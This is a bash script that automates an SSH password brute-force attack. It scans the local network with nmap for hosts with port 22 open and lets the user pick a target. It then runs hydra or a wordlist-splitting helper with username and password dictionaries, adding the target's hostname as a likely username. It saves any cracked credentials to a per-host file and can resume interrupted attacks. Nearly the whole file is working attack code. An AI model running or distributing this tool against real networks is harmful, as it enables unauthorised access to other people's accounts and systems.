#!/bin/bash

transparent="\e[0m"
bReverse="\e[7;1m"
title="\e[3;33m"
red="\033[1;31m"
green="\033[1;32m"
purple="\033[0;35m"
yellow="\033[1;33m"

#---------------------------------User select the interface------------------------------

networkC=""

#----------Stuff------------------------------------------------------------------------------------
function networkAdress {
	allInterface=$(ip link show | grep '^[1-9]' | cut -d ' ' -f 2  | cut -d ":" -f -1 | grep -v "lo")
	ans="n"
	while [ $ans != "y" ]
	do
		for interface in $allInterface
			do
			clear
			echo -e $title" choose the interface :"$transparent
			echo -e $bReverse""$interface" (y/n)"$transparent
			read ans
			if [ $ans = "y" ]; then
				netMask=$(sudo ip a show $interface | grep "inet " | cut -d " " -f 6 | cut -d "/" -f 2)
				network=$(sudo route -n | grep $interface | cut -d " " -f 1 | grep -v "0.0.0.0")
				networkC=$network"/"$netMask
				if [ -z $network ]; then
					echo "interface not initialized"
					exit
				fi
			fi
		done
	done
}

#---------------------------------Restore a bruteforce process-----------------------------
if [ ! -e ".restoreBruteForcessh" ]; then 
			echo "no restore file found."
else
	clear
	target=$(cat .restoreBruteForcessh | cut -d " " -f 1)
	dico=$(cat .restoreBruteForcessh | cut -d " " -f 2)
	option=$(cat .restoreBruteForcessh | cut -d " " -f 3)
	user=$(cat .restoreBruteForcessh | cut -d " " -f 4)
	begin=$(cat .restoreBruteForcessh | cut -d " " -f 5)
	echo -e $green"we found a previous session !"$transparent
	echo -e "you were attacking$title $target "$transparent"with$title $dico"$transparent	 
	echo "press y to resume the last bruteforce attack"
	echo "press n to start a new  bruteforce attack"
	read ans 
	if [ $ans = "y" ]; then
		echo "./bruteforce/src/cutterBruteForce.sh $target $dico $option $user "ssh" $begin"
		./bruteforce/src/cutterBruteForce.sh $target $dico $option $user "ssh" $begin
		rm ".restoreBruteForcessh"
		echo -e $green"result saved in result/scanNetwork/pass_hostname"$transparent
		echo -e $title"press a button to  quit"$transparent
		read tmp
		return
	else 
		rm ".restoreBruteForcessh"
	fi
fi



#---------------------------------Scann the network------------------------------
clear
#if a last version exists, the user can choose whether to use it or to do a new scan
lastVersionDate=$(date -r result/scanNetwork/scanSSH "+%D")
#if a scan already exists
if [ $? -eq 0 ]; then
	#if the file has been created more than an hour ago
	if [ $((`date +%s`-`date -r result/scanNetwork/scanSSH +%s`)) -gt 3600 ]; then
		clear
		rm result/scanNetwork/scanSSH 2> /dev/null
		networkAdress
		nmap -p 22 $networkC -oG result/scanNetwork/scanSSH --open
	else
		echo -e $green"we found a recent ssh scan file."$transparent
		echo "do you want to use it (press y)"
		echo "or rescan the network (press n)?"
		read ans
		if [ $ans = "y" ]; then
			echo -e $green"ok, let's go ahead!"$transparent
			sleep 1
		else
			clear
			rm result/scanNetwork/scanSSH 2> /dev/null
			networkAdress
			nmap -p 22 $networkC -oG result/scanNetwork/scanSSH --open
		fi
	fi
else
	clear
	networkAdress
	nmap -p 22 $networkC -oG result/scanNetwork/scanSSH --open
fi

# -p 22 because 22 is the ssh port
# -oG because we want a "grepable" output file, it's easier to manipulate with bash
# for more information go to https://nmap.org/ or see nmap -h
#nmap -p 22 $networkC -oG result/scanNetwork/scanSSH

hostnamesArray=($(cat result/scanNetwork/scanSSH | grep "Ports" | cut -d "(" -f 2 | cut -d ")" -f 1))
statesArray=($(cat result/scanNetwork/scanSSH | grep "Ports" | cut -d " " -f 4 | cut -d "/" -f 2))
addressArray=($(cat result/scanNetwork/scanSSH | grep "Ports" | cut -d " " -f 2))

#---------------------------------User select a target------------------------------
ans="n"
i=0
# set how many host you can see in the same time on the screen
if [ ${#statesArray[@]} -gt 4 ]; then
	nDisplay=4
else
	nDisplay=$((${#statesArray[@]}-1))
fi
while [ $ans != "y" ]
do
	clear
	echo -e $title"Select a target :"$transparent
	if [  ${statesArray[i]} = "open" ]; then
		colorS=$green
	else
		colorS=$red
	fi

	echo -e $bReverse"-"${hostnamesArray[i]}"-"$transparent"state: "$colorS" "${statesArray[i]}$transparent
	echo "|-> adress "${addressArray[i]}

	for j in `seq $(($i+1)) $(($i+$nDisplay))`;
	do
		modJ=$(($j % ${#statesArray[@]}))
		if [  ${statesArray[$modJ]} = "open" ]; then
			colorS=$green
		else
			colorS=$red
		fi
		echo -e "${hostnamesArray[modJ]}" "state: "$colorS" "${statesArray[modJ]}$transparent
		echo "|-> adress "${addressArray[modJ]}
	done

	read ans
	if [ $ans = "y" ]; then
		break
	else
	i=$((($i+1)%${#statesArray[@]}))
	fi
done

#--------------------------------- -----------------------------------------

username=""
password=""
usernameoption=""
passwordOption=""
bool="0"
clear
echo -e $title"Select an option for the username"$transparent
echo -e "Use a dico for the username | $title press y$transparent"
echo -e "Select a username in listUser.txt | $title press n$transparent"
echo -e "Enter the name with a keyboard | $title press another key$transparent"
read ans
#select a dico
if [ $ans == "y" ]; then
	dicoArray=($(ls conf/dico))
	if [ ${#dicoArray[@]} -gt 8 ]; then
		nDisplay=4
	else
		nDisplay=$((${#dicoArray[@]}-1))
	fi
	k=0
	ans="n"
	while [ $ans != "y" ]
	do
		clear
		echo "Ok so you need to use a dictionnary."
		echo "please select a dictionnary :"
		echo -e $bReverse""${dicoArray[k]}" "$transparent

		for j in `seq $(($k+1)) $(($i+$nDisplay))`;
		do
			modJ=$(($j % ${#dicoArray[@]}))
			echo ${dicoArray[modJ]}
		done
		read ans
		if [ $ans = "y" ]; then
			break
		else
		k=$((($k+1)%${#dicoArray[@]}))
		fi
	done
	username=$PWD"/conf/dico/"${dicoArray[k]}
	usernameOption="-L "

#select from bruteforce/conf/listUser.txt
elif [ $ans == "n" ]; then
	#add the hostname from listUser.txt
	sed -i "1i${hostnamesArray[i]}" bruteforce/conf/listUser.txt
	
	userArray=($(cat bruteforce/conf/listUser.txt))
	size=$(wc -l bruteforce/conf/listUser.txt | cut -d " " -f 1)
	
	#How many user name are display in the same time
	if [ $size -gt 5 ]; then
		nDisplay=5
	else
		nDisplay=$(($size-1))
	fi

	ans="n"
	i=0
	clear
	echo -e $yellow"Generally the username is the same as the hostname"
	echo -e "So i temporarly add it in the list for you :)"$transparent
	while [ $ans != "y" ]; 
	do
		echo -e $title"Select an username in the list :"$transparent
		echo -e $bReverse"-"${userArray[i]}"-"$transparent
		
		for j in `seq $(($i+1)) $(($i+$nDisplay))`;
		do
			modJ=$(($j % $size))
			echo ${userArray[modJ]}
		done
		
		echo "   V"
		read ans
		
		#protect against empty input
		if [ -z $ans ];then
			ans="n"
		fi
		
		if [ $ans != "y" ]; then
			i=$((($i+1)%$size))
		fi
		clear
	done
	
	username=${userArray[i]}
	usernameOption="-l"
	#supress the hostname from listUser.txt
	sed -i '1d' bruteforce/conf/listUser.txt
else
	clear
	echo "please enter the username :"
	read username
	#add the name of the computer in the username dictionnary
	usernameOption="-l "
fi

clear
echo -e "If you$red don't know$transparent the password press y/n"
echo -e "else press another key to enter the password"
read ans
echo $ans
if [ $ans == "n" ] || [ $ans == "y" ] ; then
	dicoArray=($(ls conf/dico))
	if [ ${#dicoArray[@]} -gt 8 ]; then
		nDisplay=4
	else
		nDisplay=$((${#dicoArray[@]}-1))
	fi
	p=0
	ans="n"
	
	while [ $ans != "y" ]
	do
		clear
		echo "Ok so you need to use a dictionnary."
		echo "please select a dictionnary :"
		echo -e $bReverse""${dicoArray[p]}" "$transparent

		for j in `seq $(($p+1)) $nDisplay`;
		do
			modJ=$(($j % ${#dicoArray[@]}))
			echo ${dicoArray[modJ]}
		done

		read ans
		if [ $ans = "y" ]; then
			break
		else
		
		p=$((($p+1)%${#dicoArray[@]}))
		fi
	done
	password=$PWD"/conf/dico/"${dicoArray[p]}
	passwordOption="-P "
else
	clear
	echo "please enter the password :"
	read password
	passwordOption="-p "
fi

echo $usernameOption $username
echo $passwordOption $password

#Because hydra generate false negative with dictionary  bigger than 90 words
#I cut gradually the password dictionary.
#This is actually the better to solve the problem ^^
#it' important to cut gradually the dictionary to avoid saturating the memory.
if [ $passwordOption = "-P" ]; then
	user="$usernameOption $username"
	./bruteforce/src/cutterBruteForce.sh ${addressArray[i]} $password $user "ssh"
	tail -n 2 result/scanNetwork/tmp >> "result/scanNetwork/pass_${hostnamesArray[i]}"
	rm result/scanNetwork/tmp
else
	echo "hydra ${addressArray[i]} ssh -V $usernameOption $username $passwordOption $password -e s -t 10"
	hydra ${addressArray[i]} ssh -vV $usernameOption $username $passwordOption $password -e s -F -o "result/scanNetwork/pass_${hostnamesArray[i]}"
fi

echo -e $green
tail -n 1 "result/scanNetwork/pass_${hostnamesArray[i]}"
echo -e $title"result saved in result/scanNetwork/pass_hostname"$transparent
echo -e $title"press a button to  quit"$transparent
read tmp





